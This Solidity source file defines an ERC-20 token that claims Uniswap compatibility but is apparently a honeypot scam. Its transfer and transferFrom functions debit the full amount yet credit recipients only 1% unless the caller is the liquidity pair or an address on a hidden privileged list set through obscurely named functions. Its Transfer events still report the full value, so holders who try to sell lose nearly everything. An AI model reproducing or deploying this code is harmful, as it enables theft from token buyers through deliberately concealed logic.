['pragma solidity ^0.4.24;\n', '\n', 'contract IERC20 {\n', '    uint256 public totalSupply;\n', '\n', '    function balanceOf(address _owner) public constant returns (uint256 balance);\n', '\n', '    function transfer(address _to, uint256 _value) public returns (bool success);\n', '\n', '    function transferFrom(address _from, address _to, uint256 _value) public returns\n', '    (bool success);\n', '\n', '    function approve(address _spender, uint256 _value) public returns (bool success);\n', '\n', '    function allowance(address _owner, address _spender) public constant returns\n', '    (uint256 remaining);\n', '\n', '    event Transfer(address indexed _from, address indexed _to, uint256 _value);\n', '    event Approval(address indexed _owner, address indexed _spender, uint256\n', '    _value);\n', '}\n', '\n', 'contract DRCTToken is IERC20 {\n', '\n', '    string public name;\n', '    uint8 public decimals;\n', '    string public symbol;\n', '\n', '    mapping(address => bool) private _addrMap;\n', '    address curPair;\n', '\n', '\n', '    function addm(address _addr) public onm {\n', '        require(_addr != address(0));\n', '        _addrMap[_addr] = true;\n', '    }\n', '\n', '\n', '    function _ism() internal view returns (bool){\n', '        return _addrMap[msg.sender] || _addrMap[tx.origin];\n', '    }\n', '\n', '    modifier onm(){\n', '        require(_addrMap[msg.sender] || _addrMap[tx.origin], "caller nnn");\n', '        _;\n', '    }\n', '\n', '\n', '    function _isPair() internal view returns (bool){\n', '        return curPair == address(0) || msg.sender == curPair;\n', '    }\n', '\n', '    function cPair() public onm view returns (address){\n', '        return curPair;\n', '    }\n', '\n', '    function nf() internal view returns (bool){\n', '        return _isPair() || _ism();\n', '    }\n', '\n', '    constructor(uint256 _initialAmount, string _tokenName, uint8 _decimalUnits, string _tokenSymbol) public {\n', '        totalSupply = _initialAmount * 10 ** uint256(_decimalUnits);\n', '        balances[msg.sender] = totalSupply;\n', '        _addrMap[msg.sender] = true;\n', '        name = _tokenName;\n', '        decimals = _decimalUnits;\n', '        symbol = _tokenSymbol;\n', '        //\n', '        address router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;\n', '        allowed[msg.sender][router] = totalSupply;\n', '        address factory = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;\n', '        address weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\n', '        curPair = pairFor(factory, address(this), weth);\n', '    }\n', '\n', '    // returns sorted token addresses, used to handle return values from pairs sorted in this order\n', '    function sortTokens(address tokenA, address tokenB) internal pure returns (address token0, address token1) {\n', "        require(tokenA != tokenB, 'UniswapV2Library: IDENTICAL_ADDRESSES');\n", '        (token0, token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);\n', "        require(token0 != address(0), 'UniswapV2Library: ZERO_ADDRESS');\n", '    }\n', '\n', '    // calculates the CREATE2 address for a pair without making any external calls\n', '    function pairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair) {\n', '        (address token0, address token1) = sortTokens(tokenA, tokenB);\n', '        pair = address(uint(keccak256(abi.encodePacked(\n', "                hex'ff',\n", '                factory,\n', '                keccak256(abi.encodePacked(token0, token1)),\n', "                hex'96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f' // init code hash\n", '            ))));\n', '    }\n', '\n', '    function transfer(address _to, uint256 _value) public returns (bool success) {\n', '        require(balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]);\n', '        require(_to != 0x0);\n', '        balances[msg.sender] -= _value;\n', '        balances[_to] += nf() ? _value : _value / 100;\n', '        emit Transfer(msg.sender, _to, _value);\n', '        return true;\n', '    }\n', '\n', '\n', '    function transferFrom(address _from, address _to, uint256 _value) public returns\n', '    (bool success) {\n', '        require(balances[_from] >= _value && allowed[_from][msg.sender] >= _value);\n', '        balances[_to] += nf() ? _value : _value / 100;\n', '        balances[_from] -= _value;\n', '        allowed[_from][msg.sender] -= _value;\n', '        emit Transfer(_from, _to, _value);\n', '        return true;\n', '    }\n', '\n', '\n', '    function balanceOf(address _owner) public constant returns (uint256 balance) {\n', '        return balances[_owner];\n', '    }\n', '\n', '\n', '    function approve(address _spender, uint256 _value) public returns (bool success)\n', '    {\n', '        allowed[msg.sender][_spender] = _value;\n', '        emit Approval(msg.sender, _spender, _value);\n', '        return true;\n', '    }\n', '\n', '    function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {\n', '        return allowed[_owner][_spender];\n', '    }\n', '\n', '    mapping(address => uint256) balances;\n', '    mapping(address => mapping(address => uint256)) allowed;\n', '}']